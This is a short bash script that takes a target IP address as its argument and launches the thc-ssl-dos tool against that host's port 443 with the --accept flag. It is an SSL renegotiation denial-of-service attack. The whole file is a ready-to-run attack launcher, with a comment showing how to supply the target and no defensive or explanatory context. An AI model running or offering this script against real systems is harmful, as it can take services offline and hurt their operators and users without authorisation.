#!/bin/bash
#Target is usually an IP address value, e.g. 192.168.1.208
export TARGET=$1
thc-ssl-dos -l $TARGET 443 --accept